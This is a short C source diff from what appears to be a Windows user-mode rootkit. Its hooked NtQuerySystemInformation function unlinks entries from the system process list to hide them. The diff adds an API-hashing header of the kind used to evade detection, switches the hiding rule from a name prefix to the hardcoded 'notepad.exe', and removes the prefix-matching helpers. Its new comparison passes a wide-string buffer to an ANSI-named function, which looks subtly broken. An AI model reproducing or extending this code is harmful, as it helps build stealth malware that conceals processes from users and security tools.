@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include <stdio.h>
 #include "structs.h"
+#include "ApiHashing.h"
 #include "common.h"
 #include "Hooks.h"
 #include "vanWin.h"
@@ -30,7 +31,7 @@ NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, P
 
         while (TRUE) {
 
-            if (HasPrefixU(curr->ImageName)) {
+            if (StringCompareA(curr->ImageName.Buffer, "notepad.exe")) {
                 prev->NextEntryOffset += curr->NextEntryOffset;
                 curr = prev;
             }
@@ -76,14 +77,4 @@ BOOL UnHook() {
     }
 
     return TRUE;
-}
-
-
-BOOL HasPrefix(LPCWSTR str)
-{
-    return str && !StrCmpNIW(str, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
-}
-BOOL HasPrefixU(UNICODE_STRING str)
-{
-    return str.Buffer && str.Length / sizeof(WCHAR) >= HIDE_PREFIX_LENGTH && !StrCmpNIW(str.Buffer, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
 }
